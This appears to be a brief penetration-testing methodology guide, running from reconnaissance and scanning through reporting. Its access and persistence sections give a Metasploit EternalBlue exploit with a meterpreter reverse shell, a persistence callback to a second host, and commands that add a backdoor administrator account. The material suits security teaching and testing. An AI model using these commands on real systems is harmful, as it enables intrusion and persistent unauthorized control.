Penetration Testing Methodology

1. Planning & Reconnaissance

Define scope, rules of engagement, and gather intelligence about the target.

# Passive reconnaissance
theHarvester -d company.com -b google
# Active reconnaissance
nmap -sS -sV -O target.com

2. Scanning & Enumeration

Discover open ports, services, and gather detailed information about the target.

# Service enumeration
nmap -sC -sV -p- target.com
# Web directory brute force
gobuster dir -u http://target.com -w wordlist.txt

3. Gaining Access

Exploit vulnerabilities to gain initial access to the target system.

# Metasploit example
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

4. Maintaining Access

Ensure persistent access to the compromised system.

# Meterpreter persistence
run persistence -X -i 30 -p 443 -r 192.168.1.50
# Create a backdoor user
net user backdoor Password123! /add
net localgroup administrators backdoor /add

5. Analysis & Reporting

Document findings, risks, and provide remediation recommendations.

  • Executive summary for management
  • Technical details for IT staff
  • Evidence (screenshots, logs)
  • Risk assessment with CVSS scores
  • Remediation guidance
